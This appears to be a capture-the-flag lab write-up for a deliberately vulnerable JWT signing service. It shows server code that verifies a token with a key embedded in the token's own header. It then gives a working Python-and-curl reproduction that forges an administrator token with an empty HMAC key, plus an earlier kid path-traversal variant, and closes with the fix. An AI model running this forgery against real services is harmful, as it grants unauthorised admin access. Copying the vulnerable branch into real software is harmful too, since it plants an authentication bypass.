# 04 Keyring: the token carries its own verification key

**Target:** `https://northwind-04-keyring.vercel.app`
**Bug:** a token that includes a key is verified with that key.

---

## What this application does

A shared signing service issues session tokens for several internal
applications. Staff sign in; the administration page checks the `sub` claim
against `administrator`.

## What goes wrong

`apps/04-keyring/lib/store.js`:

```js
if (header.jwk && typeof header.jwk.k === 'string') {
  const embedded = createHmac(HMAC_ALGORITHM, header.jwk.k)
    .update(`${encodedHeader}.${encodedPayload}`)
    .digest();
  const given = Buffer.from(encodedSignature, 'base64url');
  if (embedded.length !== given.length || !timingSafeEqual(embedded, given)) return null;
  return { ...payload, _verified: false };
}

if (header.alg !== ACCEPTED_ALGORITHM) return null;
```

A JWK is a standard way of writing a key as JSON, and a `kid` naming the key
that signed a token is a normal feature. Using one that arrived inside the
token being verified is the problem. The HMAC computation is correct; it is
just performed with a key the sender chose.

An empty key is a valid HMAC secret, which is enough to sign a token that
verifies.

## Reproducing it

```bash
BASE=https://northwind-04-keyring.vercel.app

curl -s -c jar.txt -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"

curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
# HTTP 403
```

Now attach a key to the token and sign with the empty string:

```bash
FORGED=$(python3 - <<'PY'
import base64, hashlib, hmac, json, time
def b64(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
now = int(time.time())
header  = {"alg": "HS256", "typ": "JWT",
           "jwk": {"kty": "oct", "kid": "attacker", "k": ""}}
payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600,
           "sub": "administrator"}
signing_input = ".".join(
    b64(json.dumps(part, separators=(",", ":")).encode())
    for part in (header, payload))
sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
print(f"{signing_input}.{b64(sig)}")
PY
)

curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}'
# G24{Y0u_Ch00s3_Th3_K3y}
```

The server's own key is never needed or recovered.

## The rule

An identifier taken from untrusted input can select from an allow-list. It
should not select from a namespace the sender can address.

## This used to be a path traversal

The original version read the verification key with
`readFileSync(KEY_ROOT + kid)`, and `kid` of `../../../../dev/null` read an
empty file, giving an empty signing key. That works on a laptop and not on a
serverless platform, because the sandbox refuses reads outside its writable
tree. Moving to Next.js does not change this; it is a property of the
platform.

The current version is the same mistake without the filesystem: the token
names the key directly. It behaves the same on a laptop, in a container and on
Vercel.

## The fix

Remove the branch and verify only with the server's own key, which is what the
pinned HS256 path already does.

## Other things that do not work here

- A random key: does not help. HMAC is keyed, so a signature cannot be
  produced without knowing the server's key. Only a key the attacker chooses
  works, which is what makes this specific rather than a general way to forge
  signatures.
- `k` missing or not a string: falls through to the pinned path.
- A forged `exp`: checked, and rejected.
- Wrong signature length: `timingSafeEqual` requires equal lengths.

## Checking it

```bash
BASE=https://northwind-04-keyring.vercel.app bash apps/solve/solve-04.sh
```